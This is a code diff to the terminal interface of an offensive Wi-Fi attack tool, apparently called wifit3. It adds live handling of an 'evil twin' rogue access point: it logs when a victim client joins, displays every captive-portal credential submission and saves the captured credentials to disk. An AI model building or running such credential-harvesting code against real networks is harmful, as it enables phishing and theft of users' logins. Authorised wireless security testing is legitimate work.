@@ -43,7 +43,7 @@ from wifit3.campaigns.pbc import WpsPbcCapture
 from wifit3.campaigns.wps.registrar import PinResult
 from wifit3.crack.handshake import handshake_uncrackable_label
 from wifit3.persist.save import (
-    save_handshake, save_pmkid, save_wep_key, save_wps_pbc, save_wps_pin,
+    save_handshake, save_pmkid, save_portal_credentials, save_wep_key, save_wps_pbc, save_wps_pin,
 )
 from wifit3.persist.config import Config
 
@@ -200,6 +200,8 @@ class FocusViewV2(Screen):
         self._wep_campaign: Optional[WepCampaign] = None
         self._wps_campaign: Optional[WpsCampaign] = None
         self._eviltwin_attack: Optional[EvilTwinCampaign] = None
+        self._eviltwin_client_logged = False   # has "a client joined" already been logged?
+        self._eviltwin_submissions_seen = 0    # portal_submissions already logged+saved
         self._pbc_campaign: Optional[WpsPbcCapture] = None
         self._pbc_user_stopped = False
         self._pbc_retry_after = 0.0   # monotonic time before which we won't re-arm a PBC retry
@@ -472,6 +474,8 @@ class FocusViewV2(Screen):
             self._finish_pmkid()
         if self._deauth_campaign is not None and self._deauth_campaign.done:
             self._finish_deauth()
+        if self._eviltwin_attack is not None:
+            self._poll_eviltwin_live_events()
         if self._eviltwin_attack is not None and self._eviltwin_attack.done:
             self._finish_eviltwin()
         if self._pbc_campaign is not None and self._pbc_campaign.done:
@@ -888,7 +892,9 @@ class FocusViewV2(Screen):
         if not ap or not array or not array.members:
             self._log("[red]✗ No target / interface. Cannot start EvilTwin.[/red]")
             return
-        self.app.push_screen(EvilTwinInputModal(ap, array.members), self._on_eviltwin_input)
+        target_bssid = ap.bssid.lower()
+        clients = [c.mac for c in array.clients.values() if (c.bssid or "").lower() == target_bssid]
+        self.app.push_screen(EvilTwinInputModal(ap, array.members, clients), self._on_eviltwin_input)
 
     def _on_eviltwin_input(self, evil_input: Optional[EvilTwinInput]) -> None:
         if evil_input is None:
@@ -899,6 +905,8 @@ class FocusViewV2(Screen):
         try:
             self._eviltwin_attack = EvilTwinCampaign(array, ap, evil_input)
             self._eviltwin_attack.run()
+            self._eviltwin_client_logged = False
+            self._eviltwin_submissions_seen = 0
         except Exception as exc:
             logger.exception("EvilTwin start failed")
             self._log(f"[bold red]✗ EvilTwin failed to start:[/bold red] {escape(str(exc))}")
@@ -911,16 +919,39 @@ class FocusViewV2(Screen):
         self._log(treelog.leaf("[dim]waiting for clients to auth…[/dim]"))
 
     def _stop_eviltwin(self) -> None:
-        """User-initiated stop. Auto-stop on capture is reaped by `_finish_eviltwin`."""
+        """User-initiated stop (also the normal end for an open twin, which never auto-stops).
+        The join itself was already logged live by `_poll_eviltwin_live_events`."""
         if not self._eviltwin_attack:
             return
         self._eviltwin_attack.request_stop()
         self._eviltwin_attack = None
         self._log("[bold red]EvilTwin stopped[/bold red]")
 
+    def _poll_eviltwin_live_events(self) -> None:
+        """Log + persist events live: a client joining, and each portal submission. Otherwise
+        invisible until the run ends, which an open twin may never do on its own."""
+        camp = self._eviltwin_attack
+        if not self._eviltwin_client_logged and camp.client_joined:
+            self._eviltwin_client_logged = True
+            self._log(treelog.leaf_ok(
+                "[bold green]✓ A client joined the open twin[/bold green]"))
+        new = camp.portal_submissions[self._eviltwin_submissions_seen:]
+        for fields in new:
+            self._eviltwin_submissions_seen += 1
+            shown = ", ".join(f"{k}={v}" for k, v in fields.items())
+            self._log(treelog.leaf(
+                f"[black bold on green] portal credentials [/black bold on green] "
+                f"{escape(shown)}"))
+            try:
+                result = save_portal_credentials(camp.ap, fields)
+                if result is not None:
+                    self._log(treelog.leaf(_save_line(result)))
+            except Exception:
+                logger.exception("failed to save portal credentials")
+
     def _finish_eviltwin(self) -> None:
         """Reap a campaign that ran to completion on its own (its task is done, the radio is
-        released). Captured is the normal path (the save banner already fired); a done-without-capture
+        released): only the secured/crackable-handshake path auto-stops. A done-without-capture
         is a crash the base logged."""
         captured = self._eviltwin_attack.captured
         self._eviltwin_attack = None
